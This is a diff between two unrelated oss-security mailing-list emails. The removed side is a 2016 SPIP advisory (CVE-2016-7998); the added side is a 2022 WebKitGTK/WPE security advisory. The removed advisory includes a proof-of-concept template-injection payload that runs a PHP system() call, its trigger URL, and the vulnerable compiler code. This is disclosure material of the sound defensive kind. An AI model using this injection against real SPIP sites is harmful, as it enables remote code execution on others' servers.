@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4965" "Wednesday" "12" "October" "2016" "15:30:12" "+0200" "Sysdream Labs" "labs@sysdream.com" "<18baff86-745c-5cfa-47c4-0bbe6552cc54@sysdream.com>" "158" "[oss-security] CVE-2016-7998: SPIP 3.1.2 Template Compiler/Composer PHP Code Execution" nil nil nil "10" "2016101213:30:12" "[oss-security] CVE-2016-7998: SPIP 3.1.2 Template Compiler/Composer PHP Code Execution" (number mark "U       labs@sysdrea Oct 12  158/4965  " thread-indent "\"[oss-security] CVE-2016-7998: SPIP 3.1.2 Template Compiler/Composer PHP Code Execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2110" "Wednesday" "9" "February" "2022" "13:23:18" "+0000" "Carlos Alberto Lopez Perez" "clopez@igalia.com" nil "48" "[oss-security] WebKitGTK and WPE WebKit Security Advisory WSA-2022-0002" nil nil nil "2" nil nil (number mark "U       clopez@igali Feb  9   48/2110  " thread-indent "\"[oss-security] WebKitGTK and WPE WebKit Security Advisory WSA-2022-0002\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] WebKitGTK and WPE WebKit Security Advisory WSA-2022-0002" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 23896 invoked by uid 550); 12 Oct 2016 13:30:32 -0000
+Received: (qmail 18023 invoked by uid 550); 9 Feb 2022 13:23:41 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,177 +12,82 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23847 invoked from network); 12 Oct 2016 13:30:32 -0000
-X-Virus-Scanned: amavisd-new at sysdream.com
-From: Sysdream Labs <labs@sysdream.com>
-To: oss-security@lists.openwall.com
-Cc: fulldisclosure@seclists.org, spip-team-owner@rezo.net
-Message-ID: <18baff86-745c-5cfa-47c4-0bbe6552cc54@sysdream.com>
-Date: Wed, 12 Oct 2016 15:30:12 +0200
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
- Thunderbird/45.3.0
+Received: (qmail 17990 invoked from network); 9 Feb 2022 13:23:41 -0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=igalia.com;
+	s=20170329; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Date:
+	Message-ID:Subject:From:Cc:To:Sender:Reply-To:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=YDUvebiAt/BE/raiRFftial+fR3uwf5mwbLk48C8i4c=; b=YQuwpXRH0khvs54smgoOMniMJI
+	v7vUYf1sd5/MGwLyfGzcS7vWszXYyEGYpn/Mn2lEX2CDVPFpsXvEaMdAqbUFWo87X0AscppEa25fi
+	u9idBn/HGvF/gOsqf9e6IIySUb9yhEec+NjjJgKGBGkGFNETdjEzDh6OaWGeB+BHTwlsDZFTvY02/
+	uZ+e1NS5NagqAyIp/SO2WJkdBDVp0iXSml2JoxNRuYuyypqjlJE6/OASB2jrvzvXP7vA/Y3WQYyVN
+	GKInb1Blsg6TM4vdkiMM2jOeDu8VUDYFvp0B8PPp9lWF4r81zr2o15bBR1ZE7uLX8hnPHwcV9hkSP
+	E20/+j2A==;
+To: webkit-gtk@lists.webkit.org, webkit-wpe@lists.webkit.org
+Cc: security@webkit.org, distributor-list@gnome.org,
+ oss-security@lists.openwall.com, bugtraq@securityfocus.com
+From: Carlos Alberto Lopez Perez <clopez@igalia.com>
+Organization: Igalia S.L.
+Mail-Followup-To: webkit-gtk@lists.webkit.org, webkit-wpe@lists.webkit.org,
+ security@webkit.org, distributor-list@gnome.org,
+ oss-security@lists.openwall.com, bugtraq@securityfocus.com
+Message-ID: <62b55912-4d43-0811-6431-0b36efdf8985@igalia.com>
+Date: Wed, 9 Feb 2022 13:23:18 +0000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
+ Thunderbird/78.10.0
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="8pERGq623s7oXEKUASg5wB6iIEmG2P51r"
-Subject: [oss-security] CVE-2016-7998: SPIP 3.1.2 Template Compiler/Composer PHP Code
- Execution
-
---8pERGq623s7oXEKUASg5wB6iIEmG2P51r
-Content-Type: multipart/mixed; boundary="abP6CBIjUnkpcPFairnjUvKl0TWB1x9qC"
-From: Sysdream Labs <labs@sysdream.com>
-To: oss-security@lists.openwall.com
-Cc: fulldisclosure@seclists.org, spip-team-owner@rezo.net
-Message-ID: <18baff86-745c-5cfa-47c4-0bbe6552cc54@sysdream.com>
-Subject: CVE-2016-7998: SPIP 3.1.2 Template Compiler/Composer PHP Code
- Execution
-
---abP6CBIjUnkpcPFairnjUvKl0TWB1x9qC
 Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+Content-Language: en-GB
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] WebKitGTK and WPE WebKit Security Advisory WSA-2022-0002
 
-## SPIP 3.1.2 Template Compiler/Composer PHP Code Execution (CVE-2016-7998)
+------------------------------------------------------------------------
+WebKitGTK and WPE WebKit Security Advisory                 WSA-2022-0002
+------------------------------------------------------------------------
 
-### Product Description
+Date reported           : February 09, 2022
+Advisory ID             : WSA-2022-0002
+WebKitGTK Advisory URL  : https://webkitgtk.org/security/WSA-2022-0002.html
+WPE WebKit Advisory URL : https://wpewebkit.org/security/WSA-2022-0002.html
+CVE identifiers         : CVE-2022-22589, CVE-2022-22590,
+                          CVE-2022-22592.
 
-SPIP is a publishing system for the Internet, which put importance on colla=
-borative working, multilingual environments and ease of use. It is free sof=
-tware, distributed under the GNU/GPL licence.
+Several vulnerabilities were discovered in WebKitGTK and WPE WebKit.
 
-### Vulnerability Description
+CVE-2022-22589
+    Versions affected: WebKitGTK and WPE WebKit before 2.34.5.
+    Credit to Heige of KnownSec 404 Team (knownsec.com) and Bo Qu of
+    Palo Alto Networks (paloaltonetworks.com).
+    Impact: Processing a maliciously crafted mail message may lead to
+    running arbitrary javascript. Description: A validation issue was
+    addressed with improved input sanitization.
 
-The SPIP template composer/compiler does not correctly handle SPIP "INCLUDE=
-/INCLURE" Tags, allowing PHP code execution by an authenticated user.
-This vulnerability can be exploited using the CSRF or the XSS vulnerability=
- also found in this advisory.
+CVE-2022-22590
+    Versions affected: WebKitGTK and WPE WebKit before 2.34.5.
+    Credit to Toan Pham from Team Orca of Sea Security
+    (security.sea.com).
+    Impact: Processing maliciously crafted web content may lead to
+    arbitrary code execution. Description: A use after free issue was
+    addressed with improved memory management.
 
-**Access Vector**: remote
-
-**Security Risk**: critical
-
-**Vulnerability**: CWE-94
-
-**CVSS Base Score**: 9.1 (Critical)
-
-**CVE-ID**: CVE-2016-7998
-
-### Proof of Concept
-
-Store a `.html` file in a random directory with the following content :
-
-    <INCLURE(xxx"\)\);}system\("touch /tmp/exploited"\);/*)>
-
-Then you can access to the following URL, with the `var_url` paramater poin=
-ting to the path corresponding to your uploaded file:
-
-    http://spip-dev.srv/ecrire/?exec=3Dvalider_xml&var_url=3Dfile:///tmp/di=
-rectory&ext=3Dhtml
-
-The PHP code `system("touch /tmp/exploited");` will be executed after 2 req=
-uests.
-
-This happens because the template file is included (if already compiled) by=
- `ecrire/public/composer.php`, line 60 :
-
-    if (!squelette_obsolete($phpfile, $source)) {
-      include_once $phpfile;
-
-and because we can "exit" the function generated by the template compiler (=
-improper sanitization when generating argumenter_squelette):
-
-    function html_xxxx($Cache, $Pile, $doublons =3D array(), $Numrows =3D a=
-rray(), $SP =3D 0) {
-      if (isset($Pile[0]["doublons"]) AND is_array($Pile[0]["doublons"]))
-        $doublons =3D nettoyer_env_doublons($Pile[0]["doublons"]);
-      $connect =3D '';
-      $page =3D (
-    '<'.'?php echo recuperer_fond( ' . argumenter_squelette("xxx"));}system=
-("touch /tmp/exploited");/*") . ', array(\'lang\' =3D> ' . argumenter_squel=
-ette($GLOBALS["spip_lang"]) . '), array("compil"=3D>array(\'/tmp/exploit.ht=
-ml\',\'html_xxxx\',\'\',1,$GLOBALS[\'spip_lang\'])), _request("connect"));
-    ?'.'>
-    ');
-      return analyse_resultat_skel('html_xxxx', $Cache, $page, '/tmp/exploi=
-t.html');
-    }
-
-Therefore, the vulnerability leads to arbitrary PHP code execution.
+CVE-2022-22592
+    Versions affected: WebKitGTK and WPE WebKit before 2.34.5.
+    Credit to Prakash (@1lastBr3ath).
+    Impact: Processing maliciously crafted web content may prevent
+    Content Security Policy from being enforced. Description: A logic
+    issue was addressed with improved state management.
 
 
-### Vulnerable code
+We recommend updating to the latest stable versions of WebKitGTK and WPE
+WebKit. It is the best way to ensure that you are running safe versions
+of WebKit. Please check our websites for information about the latest
+stable releases.
 
-The vulnerable code is located in the `argumenter_inclure` function (`ecrir=
-e/public/compiler.php`), line 123.
+Further information about WebKitGTK and WPE WebKit security advisories
+can be found at: https://webkitgtk.org/security.html or
+https://wpewebkit.org/security/.
 
-    if ($var !=3D=3D 1) {
-      $val =3D ($echap ? "\'$var\' =3D> ' . argumenter_squelette(" : "'$var=
-' =3D> ")
-        . $val . ($echap ? ") . '" : " ");
-    }
-
-### Timeline (dd/mm/yyyy)
-
-* 15/09/2016 : Initial discovery
-* 26/09/2016 : Contact with SPIP Team
-* 27/09/2016 : Answer from SPIP Team, sent advisory details
-* 27/09/2016 : Fixes issued for PHP Code Execution
-* 30/09/2016 : SPIP 3.1.3 Released
-
-### Fixes
-
-* https://core.spip.net/projects/spip/repository/revisions/23186
-* https://core.spip.net/projects/spip/repository/revisions/23189
-* https://core.spip.net/projects/spip/repository/revisions/23192
-
-### Affected versions
-
-* Version <=3D 3.1.2
-
-### Credits
-
-* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
-
-
---=20
-SYSDREAM Labs <labs@sysdream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-
-
-
-
-
---abP6CBIjUnkpcPFairnjUvKl0TWB1x9qC--
-
---8pERGq623s7oXEKUASg5wB6iIEmG2P51r
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
-
-iQIcBAEBCAAGBQJX/jrkAAoJEI60jNnVslmhddIQAMlnkQEYFliBR6xgKNW7O34b
-5sYagSSgyBJpOjj9ziOGO4kAbepl30kZmMYz0tSjbxBtQDrEaZGOFZiUC6Kljd6a
-L4R52Yr2KJ6gOBgRu/sRR5G612lE3j5xYd5XYk7/5bT30Rq7ynUhIwpdyO1cr/qq
-26rHTqSpI+hw+75DswDaPUqOVbu/sX4UB2Vj5yPxldxvdqjJ0KizmxOHtuW9d8xk
-t11A7jcV3rsvsb1nXva5UQ0wCMfQ9bTmWHGl+Truvaos2fCBJixovPYqmTjavCk5
-ie9kyuOPx4YywHVIGhaM3dbjQwn0muPpwFhj1iEXIijs5cjQ2C85+r8PSbhz7JEF
-ujujAsYfmRb1o8zQD+DfM3mE+lKqUZy+j4oBznGDTKPvS1JgsdS87RoUEYkde1+K
-uGMYCgpfG4oP1z1dwKqkkge+7yRrBvzQau6jTZ1zcms0w0Xca4DWjuau+AodmzxI
-qJ4H5W4SJHQQhaaGxTI7mfIsDVTKSZMix+o39EJLqtrvYt5Mdygl/BKcN5f47+6I
-QG8Y/NEbSmQ/udDyUXVDIosWhFSIbXTsnBFNeqKDk3iuOOkv5OEA5ldCc4wpbpab
-x2UHeGFUKfpdv6C7KPtYZ3xY1DqI0XlbNPl7yp+kLpaLpI4Dpr+aUnqRNKjzNhMH
-NOhro228/G+pDVze21rH
-=LF2c
------END PGP SIGNATURE-----
-
---8pERGq623s7oXEKUASg5wB6iIEmG2P51r--
+The WebKitGTK and WPE WebKit team,
+February 09, 2022
